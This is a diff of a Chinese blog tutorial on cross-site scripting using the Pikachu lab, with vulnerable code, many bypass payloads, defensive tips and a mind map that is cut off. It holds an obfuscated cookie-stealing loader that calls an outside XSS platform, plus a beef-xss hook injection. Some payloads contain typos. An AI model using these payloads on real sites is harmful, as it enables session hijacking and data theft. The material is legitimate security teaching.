+            $("#bg").show()
+            $(".markdownIt-TOC li a").css("color","PaleTurquoise")
+            $(".text p, .text ul").css("color","rgba(0, 0, 0, 0.7)")
+            $("#articlecontent").css("color","black")
+            $(".post-copyright").css("background","#f9f9f9")
+            $('blockquote').css("background","#eff8f0")
+            $("#articlecontent").css("background","white")
+            $(".moon").attr("src","https://xmoct.github.io/media/images/moon.png")
+            $('body').css("background","LightCyan")
+            moonlightState = false
+        }
+    }
+</script>
+<!----夜间模式👆--></div>
+            <!--------------- pc端菜单栏👆 ---------------->
+
+            <!-- ----------------左侧菜单栏html 👇-------------------------------------->
+            
+            <div>
+                <div id="tab1" class="tab">
+                    <div class="bars">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                    <div class="close"></div>
+                </div>
+                <div class="col-md-1 col-lg-3"></div>
+                <!-- main标签，pjax渲染时加载以下内容👇 -->
+                <div id="main" class="col-xs-12 col-sm-12 col-md-12 col-lg-7" style="padding:0;">
+                    <div class="readingmode" onclick="readingmode()">阅</div>
+                    <link rel="stylesheet" href="https://xmoct.github.io/media/css/font-awesome.css">
+
+<body>
+    <div class="allcontent" id="postdetail">
+        <div class="postshow postpadding" style="padding-bottom: 0;">
+            
+            <div class="postdetailimg">
+                <img src="https://xmoct.github.io/post-images/kua-zhan-jiao-ben-gong-ji.png" class="postimage" style="cursor:auto">
+            </div>
+            <div class="postinfo-detail">
+                <div class="postdate"><i class="fa fa-calendar"></i>2023-07-26</div>
+                <div class="poststatus postdate"><i class="fa fa-clock-o"></i> 37 min read</div>
+                <div class="posttag">
+                    
+                    <a data-pjax href="https://xmoct.github.io/tag/5jQBvl5Eb/" class="postlink">
+                        <i class="fa fa-tag"></i> Web安全
+                    </a>
+                    
+                </div>
+            </div>
+            
+        <div id="articlecontent">
+            <div id="texttitle" style="text-align: center">
+                <h2 id="ptitle">跨站脚本攻击</h2>
+                <!-- id 将作为查询条件 -->
+                <div id="pl" style="display:none">https://xmoct.github.io/post/kua-zhan-jiao-ben-gong-ji/</div>
+                <div id="rootaddr" style="display:none">https://xmoct.github.io</div>
+                
+            </div>
+            <div class="text ">
+                <h1 id="xss">XSS</h1>
+<h2 id="简述">简述</h2>
+<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。它是指恶意攻击者往web页面中插入恶意script代码，当用户浏览该页面时，嵌入其中的script代码被执行，从而达到恶意攻击用户的目的</p>
+<!-- more -->
+<p>一般XSS可以分为如下几种<strong>常见类型</strong>：</p>
+<ol>
+<li>反射性XSS;</li>
+<li>存储型XSS;</li>
+<li>DOM型XSS;</li>
+</ol>
+<!-- more -->
+<h1 id="靶场练习">靶场练习</h1>
+<p><code>https://github.com/xmoct/pikachu/vul/xss/xss.php</code></p>
+<h2 id="反射型xss">反射型xss</h2>
+<blockquote>
+<p>一般是用户输入的参数内容会直接回显在页面上，通过提交url来构造攻击代码。反射型xss的攻击需要将url发送给受害者，诱导受害者点击才会触发</p>
+</blockquote>
+<h3 id="get型">GET型</h3>
+<ol>
+<li>提交1 效果</li>
+<li>提交 <code>&lt;script&gt;alert('欢迎来到XSS学习')&lt;/script&gt;</code> 效果</li>
+<li>常见弹窗函数</li>
+</ol>
+<blockquote>
+<p>confirm()<br>
+prompt()<br>
+alert()</p>
+</blockquote>
+<ol start="4">
+<li>代码分析</li>
+</ol>
+<ul>
+<li>存在危险函数echo
+<ul>
+<li>存在危险函数echo</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-php">&lt;div id=&quot;xssr_main&quot;&gt;
+              &lt;p class=&quot;xssr_title&quot;&gt;Which NBA player do you like?&lt;/p&gt;
+              &lt;form method=&quot;get&quot;&gt;
+                  &lt;input class=&quot;xssr_in&quot; type=&quot;text&quot; maxlength=&quot;20&quot; name=&quot;message&quot; /&gt;
+                  &lt;input class=&quot;xssr_submit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+              &lt;/form&gt;
+              &lt;?php echo $html;?&gt;   //危险函数 echo
+          &lt;/div&gt;
+</code></pre>
+<ul>
+<li>追踪变量$html</li>
+</ul>
+<pre><code class="language-php">$html=''; // $html 是变量html
+if(isset($_GET['submit'])){  // 判断是否存在submit
+  if(empty($_GET['message'])){  // 判断是否 message的值为空
+      $html.=&quot;&lt;p class='notice'&gt;输入'kobe'试试-_-&lt;/p&gt;&quot;;
+  }else{
+      if($_GET['message']=='kobe'){ // 如果时kobe 则html =...
+          $html.=&quot;&lt;p class='notice'&gt;愿你和{$_GET['message']}一样，永远年轻，永远热血沸腾！&lt;/p&gt;&lt;img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' /&gt;&quot;;
+      }else{   // 如果不是 则html= 。。。
+          $html.=&quot;&lt;p class='notice'&gt;who is {$_GET['message']},i don't care!&lt;/p&gt;&quot;;
+      }
+  }
+}
+</code></pre>
+<h3 id="post型">POST型</h3>
+<ol>
+<li>登录进去</li>
+<li>跟前面一样，只不过这里传递参数方式变成了post</li>
+<li>利用方法</li>
+</ol>
+<ul>
+<li>构造html ，让html实现自动提交表单的功能（chatgpt）</li>
+<li>让受害者点击html链接</li>
+<li>xss平台获取cookie ， 替换cookie</li>
+<li>登录成功<br>
+<strong>html样例</strong>：</li>
+</ul>
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+window.onload = function() {
+document.getElementById(&quot;postsubmit&quot;).click();
+}
+&lt;!-- window.onload() 方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。 --&gt;
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt;
+&lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; style=&quot;display:none&quot; name=&quot;message&quot; value=
+&quot;&lt;/tEXtArEa&gt;'&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2F3s.wf%2FjvY0%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;&quot;
+/&gt;
+&lt;div style=&quot;display:none;&quot;&gt;&lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/div&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>xss平台<br>
+<code>https://xss.pt/xss.php</code></li>
+</ul>
+<h3 id="存储型xss">存储型xss</h3>
+<blockquote>
+<p>攻击者将构造的恶意代码传入服务器，并存储在服务器端，在其他用户下一次访问一个看似正常的连接时，就会触发并执行恶意代码</p>
+</blockquote>
+<ol>
+<li>留言</li>
+<li>闭合标签<br>
+<code>&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;p&gt;</code></li>
+<li>代码分析</li>
+<li>将传入的值 写进插入数据库中</li>
+<li>从数据库中查询</li>
+</ol>
+<pre><code class="language-php">&lt;?php echo $html;
+                  $query=&quot;select * from message&quot;; // SQL 查询语句，从 'message' 表中选择所有行
+                  $result=execute($link, $query); // 使用 $link 连接执行查询
+                  while($data=mysqli_fetch_assoc($result)){ // 遍历查询返回的每一行
+                      echo &quot;&lt;p class='con'&gt;{$data['content']}&lt;/p&gt;&lt;a href='xss_stored.php?id={$data['id']}'&gt;删除&lt;/a&gt;&quot;;
+                  }   // 输出当前行的内容,包含在一个带有类名为 'con' 的段落标签中
+</code></pre>
+<h3 id="dom型xss">DOM型xss</h3>
+<blockquote>
+<p>与反射型xss相似 ，但他不是服务端直接回显出JavaScript代码，而是由于开发者在编写前端代码时，写在html中Javascript代码和引入的JavaScript资源文件存在缺陷导致的; 触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情</p>
+</blockquote>
+<p>DOM概述<br>
+<code>https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction</code></p>
+<ol>
+<li>Javacript伪协议<br>
+<code>javascript:alert(1)</code></li>
+<li>代码分析<br>
+追text</li>
+</ol>
+<pre><code class="language-php">&lt;script&gt;
+     function domxss(){
+      // 获取id为&quot;text&quot;的元素的值并赋给变量str
+       var str = document.getElementById(&quot;text&quot;).value;
+     // 将一个带有动态链接的&lt;a&gt;标签的HTML内容赋给id为&quot;dom&quot;的元素
+       document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;&quot;;
+       }
+     //试试：'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt;
+     //试试：' onclick=&quot;alert('xss')&quot;&gt;,闭合掉就行
+&lt;/script&gt;
+</code></pre>
+<h2 id="xss漏洞检测">Xss漏洞检测</h2>
+<h3 id="反射型">反射型</h3>
+<p><strong>传统方法</strong></p>
+<blockquote>
+<p>传统检测方法即为直接发送xss利用代码的形式，然后检测页面中是否存在被植入的xss代码</p>
+</blockquote>
+<ol>
+<li>是否可以插入<code>&lt;script&gt;标签</code></li>
+</ol>
+<pre><code class="language-php">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;a=alert;a(1)&lt;/script&gt;
+&lt;script&gt;location.href=&quot;javascript:alert(2)&quot;&lt;/script&gt;
+&lt;script&gt;location.href=location.hash.substr(1)&lt;/script&gt;
+&lt;script&gt;location.href=location.search.sunstr(1)&lt;/script&gt;
+</code></pre>
+<ol start="2">
+<li>是否可以插入任意标签+on事件组合</li>
+</ol>
+<pre><code class="language-php">&lt;img src=1 onerror=alert(1) &gt;
+&lt;svg onload=alert(1) &gt;
+&lt;input onmouseover=alert(1)&gt;
+&lt;a href=&quot;x&quot; onclick=&quot;alert(1)&quot;&gt;click me&lt;/a&gt;
+</code></pre>
+<ol start="3">
+<li>是否可以插入<code>&lt;iframe&gt;</code>标签+src组合</li>
+</ol>
+<pre><code class="language-php">&lt;iframe src=&quot;javascript:top.alert(1)&quot;&gt;
+&lt;iframe src=&quot;java script:top.alert(1)&quot;&gt;
+</code></pre>
+<ol start="4">
+<li>是否可以插入<base>标签+href组合</li>
+</ol>
+<pre><code class="language-php">&lt;base href=&quot;http://wwww.xxxx.com/&quot;&gt;
+</code></pre>
+<p><strong>模糊测试</strong></p>
+<blockquote>
+<p>不直接发送xss payload，而是通过检测不同回显点位置下的关键字符过滤情况的方法，被称为模糊xss漏洞检测技术</p>
+</blockquote>
+<ol>
+<li>判断回显参数</li>
+<li>发送Payload请求（简化特殊字符序列）</li>
+</ol>
+<pre><code class="language-PHP"> '
+''
+&lt;&gt;
+&lt;/script&gt;
+&lt;%27&gt;
+%25%27
+\x27
+\u0027
+%22
+%2522
+\x22
+\u0022
+.....
+</code></pre>
+<ol start="3">
+<li>
+<p>根据回显点位置和过滤字符情况综合对比</p>
+<ol>
+<li><code>&lt;script&gt;</code> 标签内 -- 可直接执行JavaScript代码</li>
+</ol>
+<blockquote>
+<ol>
+<li><code>&lt;script&gt;</code>aa<code>&lt;/script&gt;</code></li>
+<li>在标签on事件之内，<code>&lt;img onerror='aa'&gt;</code></li>
+<li>在Javascript:之后,<code>&lt;iframe src=&quot;javascript:aa&quot;&gt;</code></li>
+</ol>
+</blockquote>
+<ol start="2">
+<li><code>&lt;script&gt;</code>标签外 一般使用一下方法进入<code>&lt;script&gt;</code>标签</li>
+</ol>
+<blockquote>
+<ol>
+<li>引入标签法；引入<code>&lt;script&gt;</code> 或<code>&lt;img&gt;</code>等其他标签on事件</li>
+<li>引入元素法；回显点如果位于标签内，则直接引入on事件</li>
+<li>JavaScript伪协议法；<br>
+<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;xx&lt;/a&gt;</code><br>
+<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+</ol>
+</blockquote>
+</li>
+</ol>
+<h3 id="存储型">存储型</h3>
+<blockquote>
+<p>存储型与反射型很大的区别是,反射型xss的回显点一般就是请求提交后的响应页面，二存储型xss的回显点不固定，有些是响应页面，有些则不是（例如：管理员后台查看），所以存储型的xss检测一般使用盲打技术</p>
+</blockquote>
+<p><strong>xss盲打</strong></p>
+<ol>
+<li>在可能存在xss的点插入payload</li>
+</ol>
+<blockquote>
+<p>现在本地用python起一个http服务<code> python -m http.server</code><br>
+<code>&lt;script&gt;window.open('http://127.0.0.1:8000')&lt;/script&gt;</code><br>
+如果xss存在，则会打开新窗口，访问 <code>http:127.0.0.1:8000</code></p>
+</blockquote>
+<ol start="2">
+<li>假设我们现在是管理员去看评论</li>
+<li>看效果<br>
+此时 ，我们只需检测我们对我们的http服务进行监控即可判断xss是否被触发<br>
+一般在测试中，我们会用到xss平台来进行监控（beef-xss和自建xss平台）</li>
+</ol>
+<h3 id="dom型">DOM型</h3>
+<blockquote>
+<p>挖掘难度较大 ，需要分析网站加载的Javacript代码;检查网页中任何可能存在缺陷的攻击点，包括且不仅限于以下范围</p>
+</blockquote>
+<pre><code class="language-PHP">docmuent
+docmuent.write
+docmuent.cookie
+innerHTML
+.html
+URL
+location
+location.search
+location.href
+location.hash
+window.name
+postMessage
+localStorage
+sessionStorage
+eval
+call
+$.getScript
+</code></pre>
+<p>例1：</p>
+<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;welcome&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;/body&gt;
+&lt;script&gt;
+    var getUrlParam = function(name){
+    //使用getUrlParam 方法，从URL中取了名为username的参数
+        var reg = new RegExp(&quot;(^|&amp;|#)&quot;+name+&quot;=([^&amp;]*)(&amp;|$)&quot;);
+        var r = window.location.href.substr(1).match(reg);
+        if (r != null ) return unescape(r[2]);
+        return null;
+    }
+    //通过document.write 写入到页面
+    document.write(&quot;welcome,&quot;+ getUrlParam(&quot;username&quot;));
+
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<ol>
+<li>创建一个正则表达式reg，用于匹配URL中的参数名和值。(<sup>|&amp;)表示参数名前面可以是字符串的开头或者是&amp;符号，([</sup>&amp;]*)表示参数值可以是任意字符除了&amp;，(&amp;|$)表示参数值后面可以是&amp;符号或字符串的结尾。</li>
+<li>使用window.location.href获取当前页面的URL，并使用substr(1)去除URL中的第一个字符（通常是?符号）。</li>
+<li>使用match(reg)方法对URL进行正则匹配，将匹配结果存储在变量r中。</li>
+<li>如果匹配结果r不为null，则使用unescape(r[2])解码参数值，并将其返回。</li>
+<li>如果匹配结果为null，则返回null。<br>
+payload:<code>welcome.php?username=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+</ol>
+<p>例2：</p>
+<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;redirect&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;/body&gt;
+&lt;script&gt;
+    var getUrlParam = function(name){
+    //使用getUrlParam 方法，从URL中取了名为username的参数
+        var reg = new RegExp(&quot;(^|&amp;|#)&quot;+name+&quot;=([^&amp;]*)(&amp;|$)&quot;);
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null ) return unescape(r[2]);
+        return null;
+    }
+    //从URL中取了名为redirectURL的参数
+    loaction.href=getUrlParam(&quot;redirectURL&quot;);
+
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>使用javascript伪协议进行xss攻击<br>
+<strong>payload</strong>: <code>?redirectURL=javascript:alert(1)</code><br>
+例3：</p>
+<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;postMessage&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;/body&gt;
+&lt;script&gt;
+
+    if (window.postMessage){
+
+        window.addEventListener(&quot;message&quot;,function(e){
+            eval(e.data);
+    });
+    }
+
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<ol>
+<li>使用条件语句if (window.postMessage)检查window.postMessage是否存在，即浏览器是否支持该方法。</li>
+<li>如果支持，则通过window.addEventListener方法给当前窗口添加一个message事件监听器。</li>
+<li>在事件监听器的回调函数中，使用eval(e.data)对接收到的消息进行求值（执行）。e是事件对象，e.data表示接收到的消息内容。<br>
+payload：</li>
+</ol>
+<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;postMessage payload&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe src=&quot;http://www.xxx.com/1.php&quot;&gt; onload=&quot;xss()&quot;&lt;/iframe&gt;
+&lt;/body&gt;
+
+&lt;script&gt;
+    function xss(){
+    window[0].postMassage(&quot;alert(1)&quot;,&quot;*&quot;)
+    }
+&lt;/script&gt;
+</code></pre>
+<ol>
+<li>在<code>&lt;body&gt;</code>标签内，有一个<code>&lt;iframe&gt;</code>元素，其src属性指向<code>http://www.xxx.com/1.php </code>网址。在<code>&lt;iframe&gt;</code>标签上有一个onload事件处理程序，当<code>&lt;iframe&gt;</code>加载完成后，会调用函数xss()。</li>
+<li>在<code>&lt;script&gt;</code>标签中定义了函数xss()。</li>
+<li>在函数xss()中，使用window[0].postMessage(&quot;alert(1)&quot;, &quot;*&quot;)尝试向指定的窗口发送一条消息。</li>
+<li>postMessage()方法用于在跨窗口通信中发送消息。第一个参数是要发送的消息内容，这里是&quot;alert(1)&quot;，表示要弹出一个警示框。第二个参数&quot;<em>&quot;表示消息接收方的目标源，这里是通配符</em>，表示可以与任何源进行通信<br>
+例4：</li>
+</ol>
+<pre><code class="language-PHP">&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;window.name&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;/body&gt;
+&lt;script&gt;
+
+document.write(&quot;this window.name is:&quot;+ window.name);
+// 直接讲window.name输出到页面， （window.name在赋值时 会自动进行toString,并且可以用于跨域通信）
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>payload</p>
+<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;window.name payload&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe src=&quot;http://www.xxx.com/1.php&quot;&gt; name=&quot;&lt;img src=x onerror=alert(1)&gt;&quot;&lt;/iframe&gt;
+&lt;/body&gt;
+</code></pre>
+<h2 id="xss的绕过方式">Xss的绕过方式</h2>
+<p>###大小写绕过<br>
+针对某些黑名单，没有将输入的参数转变为小写产生这个漏洞</p>
+<p><strong>payload</strong>:<br>
+<code>&lt;scRIpT&gt;alErt(1)&lt;/ScrIpT&gt;</code></p>
+<h3 id="双写绕过">双写绕过</h3>
+<p>针对将我们的敏感标签替换为空，但是未加循环验证导致</p>
+<p><strong>payload</strong>:<br>
+<code>&lt;scr&lt;script&gt;ipt&gt;aleralert(1)t(1)&lt;/scr&lt;/script&gt;ipt&gt;</code><br>
+或者：<br>
+<code>&lt;scr&lt;--that--&gt;ipt&gt;</code></p>
+<p>第二种利用注释符将中间置空</p>
+<h3 id="编码转义">编码转义</h3>
+<p>这里可以利用编码加密绕过一些关键词黑名单的过滤</p>
+<p>payload：<br>
+<code>&lt;script&gt;eavl(atob(&quot;PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;));&lt;/script&gt; </code></p>
+<ul>
+<li>eval()用于将字符串当作程序执行，atob()用于解密base6</li>
+</ul>
+<p><code>&lt;a href=&quot;data:text/html;base64&quot;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;1&lt;/a&gt;</code></p>
+<p>除了base64，我们也可以通过url多次编码来绕过，这里就不做演示。</p>
+<h3 id="实体编码绕过">实体编码绕过</h3>
+<p>这里其实就是利用<code>&lt;svg&gt;</code>标签将后面编码后的字符还原</p>
+<p><strong>payload</strong>:<br>
+<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</code></p>
+<p>实体编码转换就是将ascii编码转unicode<br>
+<strong>常用实体编码</strong></p>
+<pre><code class="language-html">空格  &amp;nbsp;            &amp;#160;    &amp;#x20;
+&lt;    &amp;lt;              &amp;#60;      &amp;#x3c;
+&gt;    &amp;gt;              &amp;#62;      &amp;#x3e;
+&amp;    &amp;amp;             &amp;#38;      &amp;#x26;
+&quot;    &amp;quot;            &amp;#34;      &amp;#x22;
+'    &amp;apos; (IE不支持)  &amp;#39;      &amp;#x27;
+:   &amp;#58;
+(   &amp;#40;
+)   &amp;#41;
+</code></pre>
+<p><strong>常用编码查询网站</strong><br>
+<code>https://symbl.cc/cn/collections/punctuation-marks/</code></p>
+<h3 id="平替符号绕过">平替符号绕过</h3>
+<p>其实就是一些符号被过滤，我们使用一些可以产生同样效果的符号进行替换。</p>
+<blockquote>
+<p>用/代替空格<br>
+用反引号代替括号、双引号<br>
+用throw代替括号<br>
+用html实体编码:代替冒号<br>
+用jsfuck编码绕过大部分字符过滤<br>
+用反单引号代替（）<br>
+包括用--&gt;注释符来把无法闭合的注释掉</p>
+</blockquote>
+<h3 id="符号被编码">符号被编码</h3>
+<p>这里符号被实体编码，但是本身闭合的符号还有=可以用<br>
+在input标签中可以使用onclick来触发<br>
+<code>x&quot; onclick=alert(1) //</code></p>
+<h3 id="其他非黑名单可用标签">其他非黑名单可用标签</h3>
+<pre><code class="language-PHP">&lt;img src=1 οnerrοr=alert(&quot;xss&quot;);&gt;
+&lt;input onfocus=&quot;alert('xss');&quot;&gt;
+&lt;input οnblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt; #竞争焦点，触发onblur事件
+&lt;input onfocus=&quot;alert('xss');&quot; autofocus&gt; #通过autofocus属性执行本身的focus事件
+&lt;details ontoggle=&quot;alert('xss');&quot;&gt;
+&lt;details open ontoggle=&quot;alert('xss');&quot;&gt; #使用open属性触发ontoggle事件
+&lt;svg οnlοad=alert(&quot;xss&quot;);&gt;
+&lt;iframe οnlοad=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;
+&lt;body/οnlοad=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<h1 id="漏洞挖掘">漏洞挖掘</h1>
+<h2 id="常见思路">常见思路</h2>
+<ul>
+<li>XSS</li>
+<li>分类
+<ul>
+<li>反射型XSS</li>
+<li>存储型XSS</li>
+<li>DOM XSS</li>
+</ul>
+</li>
+<li>挖掘思路（有框必插）
+<ul>
+<li>第一步：寻找插入点
+<ul>
+<li>反射型：不跟后端数据产生交互的点</li>
+<li>存储型：跟后端数据库产生交互的点</li>
+<li>DOM XSS
+<ul>
+<li>页面重定向</li>
+<li>取值写入页面或动态执行</li>
+<li>使用存在的缺陷的第三方库或通用组件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>第二步：测试注入点提交的内容是否可以注入到页面</li>
+<li>判断是否出现过滤行为（模糊测试）</li>
+<li>第四步：根据注入点内容所在网页位置部分的DOM 结构构造Payload进行测试</li>
+</ul>
+</li>
+<li>常见漏洞点
+<ul>
+<li>日志处</li>
+<li>订单处</li>
+<li>文章处</li>
+<li>图片上传处</li>
+<li>留言处</li>
+<li>聊天室</li>
+<li>请求头处</li>
+<li>作品处</li>
+<li>反馈处</li>
+<li>发帖处</li>
+<li>资料处</li>
+<li>模板处</li>
+</ul>
+</li>
+</ul>
+<p><strong>工具推荐</strong><br>
+<code>https://github.com/xmoct/FxxkXSS</code></p>
+<h2 id="案例分析">案例分析</h2>
+<h3 id="url中的xss">url中的xss</h3>
+<ol>
+<li>值为1时 页面不存在</li>
+<li>值为payload：<code>&lt;script&gt;alert('url')&lt;/script&gt;</code>时，弹框</li>
+</ol>
+<h3 id="留言处">留言处</h3>
+<ol>
+<li>输入payload: xss#<code>&lt;img src=1 onerror=alert('s')&gt;</code> //可能不会</li>
+<li>输入payload: xss#<code>&lt;img src=1 onerror=alert(1)&gt;</code> //弹窗,document.domain</li>
+<li>弹窗</li>
+</ol>
+<h3 id="文件上传">文件上传</h3>
+<ol>
+<li>上传头像</li>
+<li>改文件后缀名 / 改content-type：text/html
+<ul>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li>弹窗</li>
+</ol>
+<h2 id="icloud-drive">icloud Drive</h2>
+<ol>
+<li>在iCloud Drive中，可以上传文件并将上传文件移动到文件夹中，这些文件和文件夹可以通过电子邮件和icloud分享给其他用户</li>
+<li>上传的每个文件夹或文件都有一个图标，可以直接编辑详细信息名称</li>
+</ol>
+<ul>
+<li><code>&lt;svg&gt;&lt;img src onerror=javasript&amp;#58;alert&amp;#40;1&amp;#41;&gt;</code></li>
+<li><code>&lt;svg javasript&amp;#58;alert&amp;#40;2&amp;#41;&gt;</code></li>
+</ul>
+<pre><code class="language-html">:   &amp;#58;
+(   &amp;#40;
+)   &amp;#41;
+</code></pre>
+<ol>
+<li>未过滤 html 标签，这里存在 XSS 漏洞</li>
+<li>把文件共享给受害者，受害者打开小窗口时，才会受到 XSS 的攻击</li>
+<li>（2021年的洞）最终支付了9000$（切记，有框，有回显，就试着x一x）</li>
+</ol>
+<h2 id="用户注册">用户注册</h2>
+<ol>
+<li>注册信息填xss</li>
+<li>别人访问你信息时就会触发</li>
+</ol>
+<h3 id="危害"><strong>危害</strong></h3>
+<blockquote>
+<p>盗取cookie<br>
+植入键盘记录器。<br>
+攻击受害者所在的局域网。<br>
+代理转发流经被攻击者的所有 Web 流量，即实施中间人攻击。<br>
+窃取或篡改应用 cookie 用于会话劫持。<br>
+更改被攻击者 Web 应用的显示内容。<br>
+绕过 CSRF 安全防护措施。<br>
+创建包含恶意 JavaScript 代码的虚假网站以及到该网站页面的链接。<br>
+发送嵌入恶意 Web URL 的电子邮件。<br>
+使用 URL 短码隐蔽真实 URL。</p>
+</blockquote>
+<h3 id="漏洞防御">漏洞防御</h3>
+<ol>
+<li>html回显内容在html页面标签之外时，实体化左右尖括号</li>
+<li>html回显内容在<code>&lt;script&gt;</code>代码快时，实体化左右尖括号、“/”、单引号等可能闭合标签的字符</li>
+<li>html回显内容通过postmessage作为输入点时 检测messageEvent的来源是否在白名单内，同时检测来源数据是否合法，是否存在恶意代码</li>
+</ol>
+<h3 id="xss修复方案">xss修复方案</h3>
+<p><strong>xss修复方案</strong><br>
+`https://zhuanlan.zhihu.com/p/262038810</p>
+<!-- more -->
+<!-- more -->
+<h3 id="工具">工具</h3>
+<p>在线生成xss<br>
+<code>http://xssor.io/#ende</code><br>
+beef-xss</p>
+<ol>
+<li>输入新密码<br>
+<code>sudo beef-xss</code></li>
+<li>登录<br>
+beef:beef</li>
+<li>插入<code>&lt;script src=&quot;http://192.168.142.53:3000/(自己的kaliIP地址):3000/hook.js&quot;&gt;&lt;/script&gt;</code></li>
+<li>上线</li>
+<li>漏洞利用</li>
+</ol>
+<h3 id="任务">任务</h3>
+<ol>
+<li>
+<p>JavaScript的<mark>on事件</mark> 并进行整理/实验</p>
+</li>
+<li>
+<p><strong>xssValidator使用</strong><br>
+<code>https://www.freebuf.com/sectool/269231.html</code></p>
+</li>
+<li>
+<p>了解beef-xss基本用法</p>
+</li>
+<li>
+<p>写通关文档（思路 / 遇到了哪些问题 /怎么解决的）<br>
+<code>https://xss.tesla-space.com/</code><br>
+Diango debug page xss漏洞（CVE-2017-12794）（看懂代码的就写一份报告 / 看不懂的就按照流程走一遍）<br>
+<code>https://vulhub.org/#/environments/django/CVE-2017-12794/</code><br>
+尝试挖挖src（有框必×）（上传文件的地方也可以试试）</p>
+</li>
+</ol>
+<h2 id="xss脑图">xss脑图</h2>
+<pre><code class="language-js">- xss
+    - 挖掘
+        - 触点
+            - Origin
+                - Inline-javascript
+                    - alert`1`
+                    - \u{61}l\u{65}rt`1` (IE 11)
+                    - '-alert(1)'
+                    - location=name
+                    - setTimeout(location)
+                    - gbk chatset: %bb\&quot;alert(1)
+                    - `&amp;{alert(1)}`
+                    - `&quot;&lt;!--&lt;script&gt;&quot;`
+                - Attribute
+                    - 普通属性
+                        - &quot;oncut=alert(1)
+                        - &quot;autofocus/onfocus=alert(1)//
+                        - &quot;onerror=alert(1)//
+                    - 事件属性
+                        - 使用HTML编码闭合JS
+                            - delFeedbak('&amp;apos;)alert(1)//')
+                        - VBScript （IE）
+                            - &lt;![if&lt;iframe/onload=vbs::alert[:]&gt;
+                            - &lt;img language=vbs src=&lt;b onerror=alert#1/1#&gt;
+                            - &lt;script language=vbs&gt;&lt;/script&gt;&lt;img src=xx:xonerror=''::alert+']'::''&gt;
+                    - 链接属性
+                        - JS URI
+                            - URL编码
+                                - javascript:alert%281%29
+                            - 无符号
+                                - javascript:name
+                                    -window.name
+                        - DATA URI (Firefox)
+                            - base64
+                                - data:text/html;base64,PHNjcmlwdD5hbGvydCgxKtwvc2NyaxBOPg==
+                            - 空格
